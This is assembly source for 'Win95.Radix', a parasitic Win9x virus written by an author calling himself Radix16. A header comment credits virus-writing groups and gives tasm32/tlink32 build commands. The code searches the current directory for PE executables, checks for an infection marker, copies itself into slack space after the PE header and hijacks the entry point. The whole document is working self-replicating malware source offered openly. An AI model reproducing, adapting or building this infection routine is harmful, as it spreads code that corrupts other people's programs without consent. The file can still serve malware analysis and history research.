;			Win95.Radix by Radix16[MIONS]  
;			   Made in Czech republic
;
;Hi,
;
;It's my first Ring3 virus for Win9x.Virus not testing WinNT system.
;
;Target		: 	PE filez
;Virus size	: 	405(402)
;Resident	:	NO
;Polymorhic	:	NO
;
;Virus not dangerous, but .....
;
;Decription AVP:
;
;http://www.avp.ch/avpve/newexe/win95/radix.stm
;
;It is a harmless nonmemory resident parasitic Win9x virus. It searches 
;for PE EXE files in the current directory, then writes itself to the 
;middle of the file, to not used space at the end of the PE header. 
;
;The virus does not manifest itself in any way. It contains the text: 
;
; Radix16

;Greets to :
;		Worf[MIONS]
;		VirusBuster/29
;		Prizzy/29A
;
;
;How to build:
;		tasm32 -ml -m5 radix.asm
;		tlink32 -Tpe -aa -c -x radix.obj,,, import32
;		pewrsec radix.exe
;
;Contacty mee :	Radix16@atlas.cz
;		Radix16.cjb.net

.386p
locals
.Model Flat,STDCALL

	extrn ExitProcess :proc
	extrn GetModuleHandleA : proc


	.Data
	db ?

	.Code

	vStart  label   byte
Start:

	db 68h
							;Save old eip
oldip:	dd offset exit				
	pushad
	Call Next
	id db 'Radix16'
Next:
	pop ebp

      
	mov esi,KERNEL32+3ch
	lodsd
	add eax,KERNEL32
	xchg eax,esi
	mov esi,dword ptr [esi+78h] 
	lea esi,dword ptr [esi+1ch+KERNEL32]
	lodsd
	mov eax,dword ptr [eax+KERNEL32]
	add eax,KERNEL32
	
	push eax
	push 20060000h                      
	push 0h                          
	push 1h
	db 68h
	currPage:
	dd FSTGENPAGE
	push 1000dh
	call eax
	pop dword ptr [_VxDCALL0+ebp-X]   
	inc eax
	jz _exit
	inc eax
							;allocation memory
	push 00020000h or 00040000h			
	push 2h
	push 80060000h
	push 00010000h
	call dword ptr [_VxDCALL0+ebp-X]
	
	
	mov dword ptr [memory+ebp-X],eax  
	
	push 00020000h or 00040000h or 80000000h or 8h
	push 0h                              
	push 1h
	push 2h
	shr eax,12
	push eax
	push 00010001h
	call dword ptr [_VxDCALL0+ebp-X]
							;Create DTA
	mov ah,1ah                         
	mov edx,dword ptr [memory+ebp-X]		;buffer     
	add edx,1000h
	call int21
	
	mov ah,4eh					;FindFirstFile
	lea edx,[_exe+ebp-X]				;What search
	xor ecx,ecx					;normal attributes
	
tryanother:
	call int21
	jc _exit					;is filez ?
	
	call _infect

	mov ah,4fh					;FindNextFile
	Jmp tryanother

_exit:
	popad
	ret

	_exe db '*.*',0					;filez search

int21:                                      
							;VxDCALL services
	push ecx                          
	push eax
	push 002a0010h
	call dword ptr [_VxDCALL0+ebp-X]
	ret

FP:							;Set file pointer
	mov ah,42h
	cdq						;xor dx,dx 
	xor cx,cx
	call int21
	ret


_infect:


	mov edx,dword ptr [memory+ebp-X]		;Name file     
	add edx,101eh
	
	mov ax,3d02h					;Open File R/W					
	call int21
	jc quit						;Error ?

	xchg eax,ebx					;FileHandle

	mov ah,3fh					;Read File
	mov ecx,1000h					;Read 1000h bytes
	mov edx,dword ptr [memory+ebp-X]		
	call int21
	jc quitz					;Error ?


	mov edi,edx
	cmp word ptr [edi],'ZM'				;Test Header (EXE)
	jne quitz					;yes or no ?
	cmp word ptr [edi+32h],'61'			;Test infection
	je quitz					;Yes, virus is in file ?
	mov word ptr [edi+32h],'61'			;No ,Save ID to file
	add edi,dword ptr [edi+3ch]			;Testing Portable Executable(PE)
	cmp word ptr [edi],'EP'
	jne quitz	


	mov esi,edi                       
	mov eax,18h					;Shift image header                  
	add ax,word ptr [edi+14h] 
	add edi,eax

							;Search end section
	movzx cx,word ptr [esi+06h]          
	mov ax,28h                        
	mul cx
	add edi,eax

	mov ecx,dword ptr [esi+2ch]    
	mov dword ptr [esi+54h],ecx 
	
	push edi                          
	sub edi,dword ptr [memory+ebp-X]    
	xchg edi,dword ptr [esi+28h]        
	mov eax,dword ptr [esi+34h]
	add edi,eax
	shr eax,12
	mov dword ptr [currPage+ebp-X],eax
	mov dword ptr [oldip+ebp-X],edi			;Save old EIP
	pop edi


	mov ecx,VirusSize				
	lea esi,[vStart+ebp-X] 				   
	rep movsb					;CopyVirus
	
	xor al,al					;SetFilePointer 0=beginning file
	call FP						;mov al,0

	mov ah,40h					;Write to file                         
	mov ecx,1000h
	mov edx,dword ptr [memory+ebp-X]
	call int21

quitz:
	mov ah,3eh					;CloseFile
	call int21

quit:

ret

exit:

	vEnd    	label   byte
	ret
	VirusSize	equ vEnd-vStart
	KERNEL32 	equ 0bff70000h			;Win9X kernel address
	FSTGENPAGE 	equ 000400000h/1000h
	X equ offset 	id
	_VxDCALL0 	dd ?
	memory  	dd ?				;Buffer

Virual_End:

ends
End Start
